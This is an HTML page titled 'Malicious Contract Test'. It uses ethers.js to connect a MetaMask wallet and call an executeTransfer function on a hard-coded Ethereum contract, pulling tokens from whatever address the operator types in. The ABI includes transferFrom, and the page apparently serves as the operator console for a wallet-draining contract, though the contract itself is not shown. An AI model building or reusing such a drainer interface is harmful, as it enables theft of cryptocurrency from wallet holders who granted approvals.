<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Contract Test</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.5.6.umd.min.js"></script>
</head>
<body>
    <h1>Malicious Contract Test</h1>
    <button id="connectButton">Connect Wallet</button>
    <button id="executeTransferButton" disabled>Execute Transfer</button>

    <script>
        let provider;
        let signer;
        let contract;

        const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 您的合约地址
        const contractABI = [
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "user",
                        "type": "address"
                    }
                ],
                "name": "executeTransfer",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "account",
                        "type": "address"
                    }
                ],
                "name": "balanceOf",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "sender",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "recipient",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transferFrom",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        document.getElementById("connectButton").onclick = async () => {
            if (window.ethereum) {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                contract = new ethers.Contract(contractAddress, contractABI, signer);
                document.getElementById("executeTransferButton").disabled = false; // 启用按钮
            } else {
                alert("Please install MetaMask!");
            }
        };

        document.getElementById("executeTransferButton").onclick = async () => {
            const userAddress = prompt("Enter the user address to transfer from:");
            try {
                const tx = await contract.executeTransfer(userAddress);
                await tx.wait(); // 等待交易确认
                alert("Transfer executed successfully!");
            } catch (error) {
                console.error(error);
                alert("Transfer failed: " + error.message);
            }
        };
    </script>
</body>
</html>
